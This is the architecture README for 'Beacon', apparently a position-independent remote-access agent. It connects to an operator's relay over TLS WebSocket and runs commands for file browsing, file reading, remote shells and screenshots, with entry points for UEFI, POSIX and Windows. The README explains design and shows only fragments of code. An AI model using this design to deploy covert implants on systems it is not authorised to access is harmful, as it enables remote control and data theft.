[< Back to Source](../README.md) | [< Back to Project Root](../../README.md)

# Beacon

Top-level application layer — connects to a relay server over WebSocket (TLS 1.3 over HTTPS) and dispatches commands from the operator.

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                          Beacon                             │
│                                                             │
│  entry_point() → DNS resolve → TLS handshake → WebSocket    │
│       │                                            │        │
│       │         ┌──────────────────────────────────┘        │
│       │         │ Message Loop                              │
│       │         │                                           │
│       │         ├─ Read WebSocket message                   │
│       │         ├─ Dispatch to command handler              │
│       │         ├─ Send response                            │
│       │         └─ Loop (reconnect on failure)              │
│       │                                                     │
│  ┌────┴─────────────────────────────────────────────────┐   │
│  │              Command Handlers                        │   │
│  ├─ Hello               → build info, SystemInfo + mask │   │
│  ├─ GetDirectoryContent → DirectoryIterator             │   │
│  ├─ GetFileContent      → File::Open + Read             │   │
│  ├─ GetFileChunkHash    → File read + SHA-256           │   │
│  ├─ OpenShell           → ShellManager::Open            │   │
│  ├─ WriteShell          → Shell::Write                  │   │
│  ├─ ReadShell           → Shell::Read                   │   │
│  ├─ CloseShell          → ShellManager::Close           │   │
│  ├─ GetDisplays         → Screen::GetDevices            │   │
│  ├─ GetScreenshot       → Screen::Capture + JPEG encode │   │
│  └─ Exit                → shouldExit, ACK + teardown    │   │
│                                                             │
└──────────────────────┬──────────────────────────────────────┘
                       │
              ┌────────┴─────────┐
              │  Platform Layer  │
              │ (syscalls/protos)│
              └──────────────────┘
```

## Connection Pipeline

The relay URL is read at startup from the `R_URL` environment variable; there is no fallback — the agent exits if `R_URL` is unset.

Full protocol stack, all implemented in-process:

```
1. DNS-over-HTTPS resolution
   └─ Builds RFC 1035 query, sends via HTTPS POST to 1.1.1.1/dns-query
      (or 8.8.8.8 as fallback)

2. TCP connection
   └─ Socket::Create + Socket::Open (5-second timeout)

3. TLS 1.3 handshake
   └─ ECDH key exchange (P-256/P-384), ChaCha20-Poly1305 cipher
      Full handshake: ClientHello → ServerHello → encrypted traffic

4. HTTP/1.1 upgrade
   └─ GET /agent with Upgrade: websocket header
      Sec-WebSocket-Key + SHA-1 challenge-response

5. WebSocket message loop
   └─ Binary frames with command dispatch
```

Every layer implemented from scratch in `src/lib/` — no OpenSSL, no libcurl, no system TLS.

## Command Dispatch

Commands are dispatched via a function pointer array indexed by command type. Each handler receives the raw payload, returns a heap-allocated response buffer, and shares state through a stack-allocated `Context` (PIC-safe — no globals):

```cpp
using CommandHandler = VOID (*)(PCHAR command, USIZE commandLength,
                                PPCHAR response, PUSIZE responseLength,
                                Context *context);

CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
// Core (mandatory, always registered)
commandHandlers[CommandType::Command_Hello] = Handle_HelloCommand;
commandHandlers[CommandType::Command_Exit]  = Handle_ExitCommand;
#if SUPPORT_FILESYSTEM
commandHandlers[CommandType::Command_GetDirectoryContent] = Handle_GetDirectoryContentCommand;
commandHandlers[CommandType::Command_GetFileContent]      = Handle_GetFileContentCommand;
commandHandlers[CommandType::Command_GetFileChunkHash]    = Handle_GetFileChunkHashCommand;
#endif
#if SUPPORT_SHELL
commandHandlers[CommandType::Command_OpenShell]  = Handle_OpenShellCommand;
commandHandlers[CommandType::Command_CloseShell] = Handle_CloseShellCommand;
commandHandlers[CommandType::Command_ReadShell]  = Handle_ReadShellCommand;
commandHandlers[CommandType::Command_WriteShell] = Handle_WriteShellCommand;
#endif
#if SUPPORT_DISPLAY
commandHandlers[CommandType::Command_GetDisplays]   = Handle_GetDisplaysCommand;
commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
#endif
```

`Hello` and `Exit` are mandatory core commands. Each other group is compiled in only when its `SUPPORT_<CATEGORY>` macro is set (default `1`); compiled-out commands answer with `StatusUnknownCommand`.

### Command: GetScreenshot

The most complex command — chains multiple subsystems:

```
Screen::Capture(device, rgbBuffer)     → raw RGB pixels
  │
  JpegEncoder::Encode(rgb, w, h, quality, writer)
  │                                      │
  │  8×8 blocks → DCT → quantize → Huffman → JFIF bitstream
  │                                      │
  └──────────────────────────────────────┘
  │
  WebSocket::Send(jpegData)            → send compressed frame
```

The JPEG encoder streams output via callback — no intermediate buffer for the full compressed image.

### Command: Shell (Open/Write/Read/Close)

Interactive shell sessions managed by `ShellManager` (`src/lib/shell/shell.h`). The beacon owns a 256-slot shell pool; `OpenShell` spawns a shell in the first free slot and returns the assigned 64-bit `shellId`, which the client must reuse for `WriteShell`/`ReadShell`/`CloseShell` (errors: `Shell_NoFreeSlot` when the pool is full, `ShellProcess_CreateFailed` when spawning fails). `CloseShell` is idempotent and frees the slot for reuse; read/write errors never auto-close the session.

The underlying `ShellProcess` per platform:

- **POSIX**: `/bin/sh` on a PTY, which multiplexes stdin/stdout/stderr on a single fd
- **Windows**: `cmd.exe` over two anonymous pipes (stdin, stdout) with stderr redirected into the stdout pipe — mirroring the single-stream POSIX PTY and ensuring stderr is actually drained (a separate, never-read stderr pipe would fill its buffer and stall `cmd.exe`)

`WriteShell` sends operator input to the shell's stdin. `ReadShell` polls for output (5000 ms initial timeout, then 100 ms) and returns whatever is available, stopping early at the shell prompt character.

## Entry Point

**File:** `src/entry_point.cc`

The unified entry point handles platform-specific initialization:

### UEFI

```c
EFI_STATUS EfiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    EFI_CONTEXT ctx;
    ctx.ImageHandle = ImageHandle;
    ctx.SystemTable = SystemTable;
    StoreContext(&ctx);           // WRMSR (x86_64) or MSR TPIDR_EL0 (ARM64)
    SystemTable->BootServices->SetWatchdogTimer(0, 0, 0, NULL);  // disable 5-min watchdog
    BeaconMain();
}
```

The EFI context is stored in a CPU register (not a global — no data sections exist) so all subsequent code can access `ImageHandle` and `SystemTable`.

### POSIX

```c
__attribute__((force_align_arg_pointer))  // re-align RSP (no CALL pushed return address)
void _start() {
    BeaconMain();
    System::Call(SYS_EXIT_GROUP, 0);      // direct syscall, no atexit handlers
}
```

### Windows

```c
void entry_point() {
    BeaconMain();
    NTDLL::ZwTerminateProcess((PVOID)-1, 0);  // -1 = NtCurrentProcess()
}
```

## Reconnection

On WebSocket disconnection, the beacon re-enters the full connection pipeline (DNS → TCP → TLS → HTTP → WebSocket). No cached state from previous connections — each reconnection is a clean start.
